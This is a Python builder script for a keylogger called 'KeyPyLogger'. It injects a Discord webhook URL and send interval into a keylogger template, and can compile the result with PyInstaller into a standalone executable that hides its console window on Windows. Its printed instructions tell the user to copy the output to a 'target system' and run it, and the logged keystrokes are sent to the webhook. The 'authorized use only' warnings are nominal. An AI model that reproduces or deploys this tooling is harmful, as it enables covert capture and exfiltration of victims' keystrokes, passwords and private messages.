#!/usr/bin/env python3
"""
KeyPyLogger Builder - Configuration and Compilation Tool
This tool creates configured versions of the keylogger ready for deployment
"""

import os
import sys
import shutil
import re
from pathlib import Path


class KeyLoggerBuilder:
    def __init__(self):
        self.base_dir = Path(__file__).parent
        self.template_file = self.base_dir / "keylogger.py"
        self.output_dir = self.base_dir / "build"

    def validate_webhook(self, webhook_url):
        """Validate Discord webhook URL format"""
        pattern = r'https://discord\.com/api/webhooks/\d+/[\w-]+'
        if not re.match(pattern, webhook_url):
            print("[!] WARNING: URL doesn't match Discord webhook format")
            confirm = input("Continue anyway? (y/n): ")
            return confirm.lower() == 'y'
        return True

    def build(self, webhook_url, send_interval=60, output_name="keylogger_configured.py"):
        """
        Build a configured keylogger

        Args:
            webhook_url (str): Discord webhook URL
            send_interval (int): Interval in seconds to send logs
            output_name (str): Name of the output file
        """
        print("\n" + "=" * 70)
        print("KeyPyLogger Builder")
        print("=" * 70)

        # Validate webhook
        if not self.validate_webhook(webhook_url):
            print("[!] Build cancelled")
            return False

        # Read template
        try:
            with open(self.template_file, 'r', encoding='utf-8') as f:
                content = f.read()
        except Exception as e:
            print(f"[!] Error reading template: {e}")
            return False

        # Replace placeholders
        content = content.replace('WEBHOOK_URL_PLACEHOLDER', webhook_url)
        content = content.replace('SEND_INTERVAL = 60', f'SEND_INTERVAL = {send_interval}')

        # Create output directory
        self.output_dir.mkdir(exist_ok=True)

        # Write configured file
        output_path = self.output_dir / output_name
        try:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(content)

            # Make executable on Unix systems
            if os.name != 'nt':
                os.chmod(output_path, 0o755)

            print(f"\n[+] Successfully built configured keylogger!")
            print(f"[+] Output: {output_path}")
            print(f"[+] Webhook: {webhook_url[:50]}...")
            print(f"[+] Send interval: {send_interval} seconds")
            print("\n[*] Next steps:")
            print(f"    1. Copy {output_name} to target system")
            print(f"    2. Install dependencies: pip install -r requirements.txt")
            print(f"    3. Run: python {output_name}")
            print("\n[!] Remember: Only use on authorized systems!")

            return True

        except Exception as e:
            print(f"[!] Error writing output file: {e}")
            return False

    def build_executable(self, webhook_url, send_interval=60, output_name=None):
        """
        Build a standalone executable using PyInstaller

        Args:
            webhook_url (str): Discord webhook URL
            send_interval (int): Interval in seconds to send logs
            output_name (str): Name of the output executable
        """
        print("\n" + "=" * 70)
        print("KeyPyLogger Executable Builder")
        print("=" * 70)

        # Check if PyInstaller is available
        try:
            import PyInstaller
        except ImportError:
            print("[!] PyInstaller not found!")
            print("[*] Install it with: pip install pyinstaller")
            return False

        # First build the configured script
        temp_script = "keylogger_temp.py"
        if not self.build(webhook_url, send_interval, temp_script):
            return False

        # Determine output name
        if output_name is None:
            if sys.platform == 'win32':
                output_name = "keylogger.exe"
            else:
                output_name = "keylogger"

        # Build executable
        script_path = self.output_dir / temp_script

        print(f"\n[*] Building executable with PyInstaller...")
        print("[*] This may take a few minutes...")

        # PyInstaller command
        import subprocess

        cmd = [
            'pyinstaller',
            '--onefile',  # Single file
            '--noconsole' if sys.platform == 'win32' else '--console',  # No console on Windows
            '--name', output_name.replace('.exe', ''),
            '--distpath', str(self.output_dir / 'dist'),
            '--workpath', str(self.output_dir / 'build_temp'),
            '--specpath', str(self.output_dir),
            str(script_path)
        ]

        try:
            result = subprocess.run(cmd, check=True, capture_output=True, text=True)

            # Clean up
            os.remove(script_path)
            shutil.rmtree(self.output_dir / 'build_temp', ignore_errors=True)

            exe_path = self.output_dir / 'dist' / output_name

            print(f"\n[+] Successfully built executable!")
            print(f"[+] Output: {exe_path}")
            print(f"\n[*] The executable is standalone and can be run without Python installed")
            print("[!] Remember: Only use on authorized systems!")

            return True

        except subprocess.CalledProcessError as e:
            print(f"[!] Error building executable: {e}")
            print(f"[!] Output: {e.output}")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return False

    def interactive_build(self):
        """Interactive configuration builder"""
        print("\n" + "=" * 70)
        print("KeyPyLogger Interactive Builder")
        print("=" * 70)
        print("LEGAL WARNING: This tool is for educational and authorized testing only!")
        print("=" * 70)

        # Get webhook URL
        print("\n[*] Step 1: Discord Webhook Configuration")
        print("[*] Create a webhook in Discord:")
        print("    1. Go to Server Settings > Integrations > Webhooks")
        print("    2. Click 'New Webhook'")
        print("    3. Copy the webhook URL")

        webhook_url = input("\n[?] Enter Discord webhook URL: ").strip()

        if not webhook_url:
            print("[!] Webhook URL is required!")
            return False

        # Get send interval
        print("\n[*] Step 2: Send Interval Configuration")
        send_interval_input = input("[?] Send interval in seconds (default: 60): ").strip()

        try:
            send_interval = int(send_interval_input) if send_interval_input else 60
            if send_interval < 10:
                print("[!] Warning: Very short intervals may trigger rate limits")
        except ValueError:
            print("[!] Invalid interval, using default (60)")
            send_interval = 60

        # Choose build type
        print("\n[*] Step 3: Build Type")
        print("    1. Python script (requires Python on target)")
        print("    2. Standalone executable (no Python required)")

        build_type = input("\n[?] Choose build type (1 or 2): ").strip()

        if build_type == "2":
            # Build executable
            output_name = input("[?] Output executable name (leave empty for default): ").strip()
            return self.build_executable(webhook_url, send_interval, output_name or None)
        else:
            # Build script
            output_name = input("[?] Output script name (default: keylogger_configured.py): ").strip()
            if not output_name:
                output_name = "keylogger_configured.py"
            return self.build(webhook_url, send_interval, output_name)


def main():
    """Main entry point"""
    builder = KeyLoggerBuilder()

    if len(sys.argv) > 1:
        # Command line mode
        if sys.argv[1] == '--help' or sys.argv[1] == '-h':
            print("KeyPyLogger Builder")
            print("\nUsage:")
            print("  Interactive mode: python builder.py")
            print("  Script mode:      python builder.py <webhook_url> [interval] [output_name]")
            print("\nExamples:")
            print('  python builder.py "https://discord.com/api/webhooks/..." 60 my_keylogger.py')
            print('  python builder.py  # Interactive mode')
            sys.exit(0)

        webhook_url = sys.argv[1]
        send_interval = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        output_name = sys.argv[3] if len(sys.argv) > 3 else "keylogger_configured.py"

        builder.build(webhook_url, send_interval, output_name)
    else:
        # Interactive mode
        builder.interactive_build()


if __name__ == "__main__":
    main()
